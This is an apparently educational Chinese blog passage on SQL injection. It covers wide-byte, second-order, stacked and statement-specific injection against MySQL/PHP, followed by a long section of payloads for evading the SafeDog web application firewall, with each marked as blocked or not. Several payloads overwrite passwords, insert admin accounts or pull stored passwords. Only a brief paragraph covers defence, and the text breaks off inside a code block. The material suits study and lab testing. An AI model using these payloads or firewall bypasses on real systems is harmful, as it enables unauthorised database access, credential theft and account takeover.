<h5 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h5><p>​		Cookie：服务器端用来记录客户端的状态。由服务端产生，保存在浏览器中。</p>
<h5 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h5><pre><code>     Referer：是HTTP header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。
</code></pre>
<h5 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For"></a>X-Forwarded-For</h5><pre><code>     X-Forwarded-For：用来识别客户端最原始的ip地址。
</code></pre>
<p>以上均是数据库当中存储了HTTP头的内容，用burp suite在HTTP头加入单引号判断报错与否，结合报错注入即可(奇奇怪怪的头注另算)。</p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>​		宽字节是指多个字节宽度的编码，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。转义函数在对这些编码进行转义时会将转义字符 ‘\’ 转为 %5c ,于是我们在他前面输入一个单字符编码与它组成一个新的多字符编码，使得原本的转义字符没有发生作用。</p>
<p>​		由于在数据库查询前使用了GBK多字节编码，即在汉字编码范围内使用两个字节会被编码为一个汉字（前一个ascii码要大于128，才到汉字的范围）。然后mysql服务器会对查询语句进行GBK编码，即下面所说的</p>
<p>​		我们在前面加上 %df’  ,转义函数会将%df’改成%df\’ , 而\ 就是%5c ，即最后变成了%df%5c’，而%df%5c在GBK中这两个字节对应着一个汉字 “運” ，就是说 \ 已经失去了作用，%df ‘ ,被认为運’ ,成功消除了转义函数的影响。</p>
<ul>
<li>‘           %27</li>
<li>\           %5c</li>
<li>%df&#39;    %df%5c’ &#x3D;》  運’</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; orderby 3--+</span></span><br></pre></td></tr></table></figure>

<h4 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h4><p>​		<strong>查看mysql是否为GBK编码，且是否使用preg_replace()把单引号转换成&#39;或自带函数addslashes()进行转义。如果上面都存在，则存在宽字节注入。</strong></p>
<h5 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h5><p>​		1、我们需要在执行sql语句之前调用一下mysql_set_charset函数，设置当前连接的字符集为gbk。‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍</p>
<p>​		mysqli_set_charset(connection,charset*)*;</p>
<p>​		把addslashes替换成mysql_real_escape_string，来抵御宽字符注入。</p>
<p>​		2、设置参数,character_set_client&#x3D;binary</p>
<p>​		3、使用utf-8编码</p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>​		二次注入利用了数据存储进数据库时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库中的字符发生了作用，形成了一条新的sql语句导致被执行。</p>
<p>​		二次注入点难以发现，但是威力巨大。</p>
<p>​		二次注入的根源在于，开发者信任数据库中取出的数据是无害的。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span> <span class="keyword">value</span>（<span class="number">2</span>，$&#123;_GET[<span class="string">&#x27;username&#x27;</span>]&#125;,$&#123;_GET[<span class="string">&#x27;password&#x27;</span>]&#125;）;</span><br><span class="line">payload:?username<span class="operator">=</span> admin<span class="string">&#x27;or&#x27;</span><span class="number">1</span> <span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">111111</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span> <span class="keyword">value</span>（<span class="number">2</span>，<span class="string">&#x27;admin\&#x27;</span><span class="keyword">or</span>\<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;111111&#x27;</span>）;</span><br><span class="line">插入数据库中变成：<span class="number">2</span>   admin<span class="string">&#x27;or&#x27;</span><span class="number">1</span>   <span class="number">111111</span></span><br><span class="line">当下一次使用这个用户名时：<span class="keyword">select</span> password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">这样会查找出admin用户名的密码，同理，修改密码也适用。</span><br></pre></td></tr></table></figure>

<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>​		在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;update users set password=&#x27;</span><span class="number">123456</span><span class="string">&#x27; where id=1; --+ </span></span><br><span class="line"><span class="string">1&#x27;</span>; handler `<span class="number">1919810931114514</span>` <span class="keyword">open</span> <span class="keyword">as</span> `a`; handler `a` read next; handler `a` <span class="keyword">close</span>;#</span><br><span class="line">查看表下的值，ctf常用</span><br></pre></td></tr></table></figure>

<p>​		使用堆叠注入场景非常少，因为受API，数据库引擎，权限的限制。web系统中一般只返回一个查询结果，我们在前端看不到返回结果，难以判断漏洞点。而且我们使用堆叠注入时必须要知道数据库的相关信息才能构造语句。</p>
<h2 id="注入点场景"><a href="#注入点场景" class="headerlink" title="注入点场景"></a>注入点场景</h2><h3 id="SELECT语句"><a href="#SELECT语句" class="headerlink" title="SELECT语句"></a>SELECT语句</h3><p><em><strong>select	<u>express</u>	from	<u>table</u>	<u>where(having)</u>	<u>order by(group by)</u>	<u>limit</u>；</strong></em></p>
<p>​		1、express</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>	$&#123;_GET[ <span class="string">&#x27; id &#x27;</span> ]&#125;,content	<span class="keyword">from</span> news;</span><br><span class="line">利用<span class="keyword">AS</span>别名的方法，直接将查询的结果显示到页面中。</span><br><span class="line">payload：?id<span class="operator">=</span>(<span class="keyword">select</span> pwd <span class="keyword">from</span> <span class="keyword">user</span>) <span class="keyword">as</span> title</span><br><span class="line"><span class="keyword">select</span>	(<span class="keyword">select</span> pwd <span class="keyword">from</span> <span class="keyword">user</span>) <span class="keyword">as</span> title,content	<span class="keyword">from</span> news;</span><br></pre></td></tr></table></figure>

<p>​		我们通过时间盲注也可获取，但如果有SQL语法，可直接构造。</p>
<p>​		2、table</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>	title	<span class="keyword">from</span>	$&#123;_GET[<span class="string">&#x27;table&#x27;</span>]&#125;;</span><br><span class="line">payload：?id<span class="operator">=</span><span class="keyword">select</span> pwd <span class="keyword">as</span> title <span class="keyword">from</span> <span class="keyword">user</span></span><br><span class="line"><span class="keyword">select</span>	title	<span class="keyword">from</span>	(<span class="keyword">select</span> pwd <span class="keyword">as</span> title <span class="keyword">from</span> <span class="keyword">user</span>);</span><br></pre></td></tr></table></figure>

<p>​		如果注入点有反引号包裹，那么需要先闭合反引号。</p>
<p>​		3、where(group)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title <span class="keyword">FROM</span> wp_news <span class="keyword">WHERE</span> id<span class="operator">=</span> $&#123;_GET[<span class="string">&#x27;id&#x27;</span>]&#125;</span><br><span class="line">payload：?ititle<span class="operator">=</span>id <span class="keyword">desc</span>,(if(<span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>))</span><br><span class="line">可以让页面睡眠<span class="number">5</span>秒，可以利用这一特点进行基于时间的注入。</span><br><span class="line">payload：?ititle<span class="operator">=</span>id <span class="keyword">desc</span>,(if(时间盲注,sleep(<span class="number">5</span>),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<p>​		４、limit</p>
<p>​		通过改变数字的大小，页面会显示更多或者更少的记录数。</p>
<p>​		在整个SQL语句没有order by关键字的情况下，可以直接使用union注入。</p>
<p>​		 5、order by	</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select id, hostname, ip, mac, status, description from servers  where status &lt;&gt; &#x27;out of order&#x27; order by xxx</span><br><span class="line"></span><br><span class="line">case when A then 1 else 0 end</span><br><span class="line"></span><br><span class="line">(case%20when%20((select%20substring(ip,§1§,1)%20from%20servers%20where%20hostname=%27webgoat-prd%27)=§2§)%20then%20hostname%20else%20id%20end)</span><br></pre></td></tr></table></figure>



<h3 id="INSERT语句"><a href="#INSERT语句" class="headerlink" title="INSERT语句"></a>INSERT语句</h3><p>1.注入点在tbl_name</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="string">&quot;insert into <span class="subst">&#123;$_GET[&#x27;table&#x27;]&#125;</span> values(6,&#x27;new2&#x27;,&#x27;new3&#x27;,&#x27;new4&#x27;)&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">payload：?table=ps <span class="title function_ invoke__">values</span>(<span class="number">4</span>,<span class="string">&#x27;newadmin&#x27;</span>,<span class="string">&#x27;newpassword&#x27;</span>)<span class="string">&quot;--+</span></span><br></pre></td></tr></table></figure>

<p>2.注入点在VALUES</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> ps <span class="keyword">VALUES</span>(<span class="number">9</span>,<span class="string">&#x27;ababa&#x27;</span>,<span class="string">&#x27;321&#x27;</span>);</span><br><span class="line">可以先闭合单引号，然后再插入一条记录，通过管理员和普通用户在同一个表，此时可以通过表字段来控制管理员权限。</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> ps <span class="keyword">VALUES</span>(<span class="number">9</span>,<span class="string">&#x27;ababa&#x27;</span>,<span class="string">&#x27;321&#x27;</span>),(<span class="number">10</span>,<span class="string">&#x27;newadmin&#x27;</span>,<span class="string">&#x27;newpassword&#x27;</span>);</span><br><span class="line">在某些情况，我们也可以将数据插入能回显的字段,假设最后一个字段有回显。</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> ps <span class="keyword">VALUES</span>(<span class="number">11</span>,<span class="string">&#x27;babababa&#x27;</span>,<span class="string">&#x27;789&#x27;</span>),(<span class="number">12</span>,<span class="string">&#x27;afa&#x27;</span>,(<span class="keyword">select</span> VERSION()));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> ps <span class="keyword">VALUES</span>(<span class="number">7</span>,‘babababa’,‘<span class="number">789</span>’),(<span class="number">8</span>,‘afa’,(<span class="keyword">select</span> password <span class="keyword">from</span> ps limit <span class="number">1</span>,<span class="number">1</span>));</span><br><span class="line">这里也可以执行<span class="keyword">select</span>语句但是要注意不能在插入的表内查询此表不然会报错。</span><br><span class="line">换成news表的插入即可。</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> news <span class="keyword">VALUES</span>(<span class="number">7</span>,<span class="string">&#x27;babababa&#x27;</span>,<span class="string">&#x27;789&#x27;</span>,<span class="string">&#x27;asdas&#x27;</span>),(<span class="number">8</span>,<span class="string">&#x27;afa&#x27;</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> ps limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;asfasfas&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="UPDATE语句"><a href="#UPDATE语句" class="headerlink" title="UPDATE语句"></a>UPDATE语句</h3><p>​		UPDATE语句适用于数据库的更新，如用户修改自己的文章、介绍信息、更新信息等。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> $&#123;_GET[id]&#125; <span class="keyword">where</span> <span class="keyword">user</span> <span class="operator">=</span><span class="string">&#x27;23&#x27;</span>;</span><br><span class="line">我们可以将id修改。</span><br><span class="line">payload：?id<span class="operator">=</span><span class="number">99</span></span><br><span class="line"></span><br><span class="line">我们可以更改其列名，以方便我们利用，</span><br><span class="line">payload：?id<span class="operator">=</span><span class="number">99</span>,<span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line">思考一下我们输入id时不知道id对应的字段名是多少的，我们在改id的同时将某一列的字段更改，那么我们就可以根据我们更改的这个字段查询这一整条信息，或者借此更改管理员密码，实现管理员账号的登录。</span><br></pre></td></tr></table></figure>

<h3 id="DELETE语句"><a href="#DELETE语句" class="headerlink" title="DELETE语句"></a>DELETE语句</h3><p>​		DELETE注入多在WHERE之后，假设注入语句如下。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$res <span class="operator">=</span> mysqli_query($conn,&quot;DELETE FROM ps WHERE id =&#123;$_GET[&#x27;id&#x27;]&#125;&quot;);</span><br><span class="line">为了防止在注入时删除数据，我们可以在后面加 <span class="keyword">and</span> sleep(<span class="number">1</span>) 让语句不报错却又无法正常执行</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> ps <span class="keyword">where</span> id<span class="operator">=</span><span class="number">11</span> <span class="keyword">and</span> sleep(<span class="number">1</span>);</span><br><span class="line">再此基础上我们结合报错注入就可以实现语句的查询。</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> news <span class="keyword">where</span> i<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">5</span>) <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(操作代码),<span class="number">0x7e</span>));</span><br></pre></td></tr></table></figure>

<p>​		也可以结合时间盲注，与报错注入相同，参考上面的时间盲注即可。</p>
<h2 id="WafByPass"><a href="#WafByPass" class="headerlink" title="WafByPass"></a>WafByPass</h2><h3 id="UNION-SELECT过狗"><a href="#UNION-SELECT过狗" class="headerlink" title="UNION　SELECT过狗"></a>UNION　SELECT过狗</h3><p>​		注释绕过</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">all</span> <span class="comment">-- %0a select 拦截</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span>  <span class="comment">-- ()%0a select 拦截</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span>  <span class="comment">-- 1%0a select 不拦截</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span>  <span class="comment">-- hex()%0a select 不拦截</span></span><br><span class="line"></span><br><span class="line">将#进行url编码<span class="operator">%</span><span class="number">23</span>绕过也可尝试，但是一般会被过滤。</span><br></pre></td></tr></table></figure>

<p>​		内联注释绕过</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span>    不拦截</span><br><span class="line"><span class="keyword">select</span>   不拦截</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> 拦截</span><br><span class="line"><span class="keyword">union</span> 各种字符 <span class="keyword">select</span> 拦截</span><br><span class="line"><span class="keyword">union</span><span class="comment">/*select*/</span> 不拦截</span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.59</span><span class="number">.129</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union/*!/*!50000select*/ 1,2,3--+  拦截</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://192.168.59.129/Less-1/?id=1&#x27;</span> <span class="keyword">union</span><span class="comment">/*!/*!5select*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+  不拦截</span></span><br><span class="line">为什么不拦截 ，因为<span class="number">50000</span>是他的版本号，你多一位少一位语句是不能能正常执行的，所以他就放行了，那么我们可以用burp来遍历这个值呢，结果的确是我们想要的</span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.59</span><span class="number">.129</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union/*!/*!11440select*/ 1,2,3--+ 不拦截</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://192.168.59.129/Less-1/?id=1&#x27;</span> <span class="keyword">union</span><span class="comment">/*!11441/*!11440select*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+ 不拦截</span></span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.59</span><span class="number">.129</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union/*!11440select*/ 1,2,3--+ 不拦截</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://192.168.59.129/Less-1/?id=-1&#x27;</span> <span class="keyword">union</span><span class="comment">/*!11440/**/</span><span class="operator">%</span><span class="number">0</span>aselect<span class="operator">*</span><span class="operator">/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+  不拦截</span></span><br><span class="line"></span><br><span class="line">使用<span class="comment">/*!5000*/</span>,<span class="comment">/**/</span>,或者两者嵌套绕过字符筛选。</span><br></pre></td></tr></table></figure>

<p>​		老生常谈 hpp 被人遗忘的手法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.59</span><span class="number">.129</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; /*&amp;id=&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span> <span class="comment">-- +*/</span></span><br><span class="line">前面说过 <span class="comment">/**/</span> 里面的内容安全狗基本不管了，那么我们用hpp 参数污染来绕过就很简单了 照成这个手法的原因是 web server 对参数的解析问题 在php<span class="operator">/</span>apache 中 它总解析最后一个id</span><br></pre></td></tr></table></figure>

<p>​		既然绕过了 <code>union select</code> 那么注入就简单了 首先来看个 <code>user()</code> ,因为它是被拦截的所以我们需要简单的绕过它</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">user</span>()   拦截</span><br><span class="line"><span class="keyword">user</span><span class="comment">/**/</span>() 拦截</span><br><span class="line"><span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/**/</span>) 拦截</span><br><span class="line">hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/**/</span>)) 不拦截</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span>  <span class="comment">-- hex()%0a select 1,schema_name,3 from `information_schema`.schemata limit 1,1</span></span><br><span class="line">用hex()<span class="operator">%</span><span class="number">0</span>a绕过<span class="comment">--+过滤</span></span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">`information_schema`.schemata</span><br><span class="line">`information_schema`.`schemata`                        <span class="operator">/</span><span class="operator">/</span>PHP中字符串的凭借方法</span><br><span class="line">information_schema.`schemata`</span><br><span class="line"></span><br><span class="line">(information_schema.schemata)                          <span class="operator">/</span><span class="operator">/</span>括号代替空格的方法，但是不能配合<span class="keyword">SQL</span>函数执行，因为函数一旦被括上就无法正常解析。</span><br><span class="line">information_schema<span class="comment">/**/</span>.schemata                        <span class="operator">/</span><span class="operator">/</span>上面提到的<span class="comment">/**/</span>绕过</span><br></pre></td></tr></table></figure>

<h3 id="盲注过狗"><a href="#盲注过狗" class="headerlink" title="盲注过狗"></a>盲注过狗</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">时间盲注</span><br><span class="line"></span><br><span class="line">sleep<span class="comment">----可以使用 BENCHMARK(500000000,MD5(&#x27;test&#x27;))绕过</span></span><br><span class="line"></span><br><span class="line">if(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) 不拦截</span><br><span class="line"> a if(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) 不拦截</span><br><span class="line"> <span class="keyword">and</span> if(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) 拦截</span><br><span class="line"> <span class="operator">|</span> if(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) 不拦截</span><br><span class="line"> <span class="operator">||</span> if(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) 拦截</span><br><span class="line"> <span class="operator">&amp;&amp;</span> if(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) 拦截</span><br><span class="line"><span class="comment">/*!and*/</span> if(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) 拦截</span><br><span class="line"> <span class="comment">/*!11440and*/</span> if(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) 不拦截</span><br><span class="line"> andaif(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) 不拦截</span><br></pre></td></tr></table></figure>

<p>​		我们这一章来试试不用内联注释内不内绕过。</p>
<p>​		查阅乌云知识库发现一个小知识点 <code>and!!!1=1 </code>and后面可以接上奇数个特殊的字符包括不限于<code>! ~ &amp; -</code> 其他还可以自己测试 那么我们的payload就能构造出来了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span><span class="operator">!</span><span class="operator">!</span><span class="operator">!</span>if((substr((<span class="keyword">select</span> hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/*!*/</span>))),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span><span class="number">1</span>),sleep<span class="comment">/**/</span>(<span class="comment">/*!5*/</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注</span><br><span class="line">使用<span class="keyword">and</span><span class="operator">!</span><span class="operator">!</span><span class="operator">!</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span>绕过</span><br><span class="line"><span class="keyword">and</span><span class="operator">!</span><span class="operator">!</span><span class="operator">!</span>substr((<span class="keyword">select</span> unhex(hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/*!*/</span>)))),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span> 拦截</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span><span class="operator">!</span><span class="operator">!</span><span class="operator">!</span>substr((<span class="keyword">select</span> unhex(hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/*!*/</span>)))),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span>r 不拦截</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span><span class="operator">!</span><span class="operator">!</span><span class="operator">!</span>substr((<span class="keyword">select</span> unhex(hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/*!*/</span>)))),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">1</span> 不拦截</span><br><span class="line"></span><br><span class="line">常规姿势绕过<span class="keyword">and</span>换成<span class="operator">&amp;&amp;</span>，结合<span class="comment">/*!*/</span>绕过</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> substr((<span class="keyword">select</span> hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/*!*/</span>))),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span><span class="number">1</span> 拦截</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!and*/</span> substr((<span class="keyword">select</span> hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/*!*/</span>))),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span><span class="number">1</span> 拦截</span><br><span class="line"></span><br><span class="line"><span class="operator">%</span><span class="number">26</span><span class="operator">%</span><span class="number">26</span> substr((<span class="keyword">select</span> hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/*!*/</span>))),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span><span class="number">1</span> 拦截</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!%26%26*/</span> substr((<span class="keyword">select</span> hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/*!*/</span>))),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span><span class="number">1</span> 不拦截</span><br></pre></td></tr></table></figure>

<h3 id="报错注入过狗"><a href="#报错注入过狗" class="headerlink" title="报错注入过狗"></a>报错注入过狗</h3><p>​		一般来说，waf会对updatexml的完整性进行判别，我们难以在阔海内做手脚，我们可以尝试在外部套壳。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*updatexml*/</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) 不拦截</span><br><span class="line"></span><br><span class="line"> <span 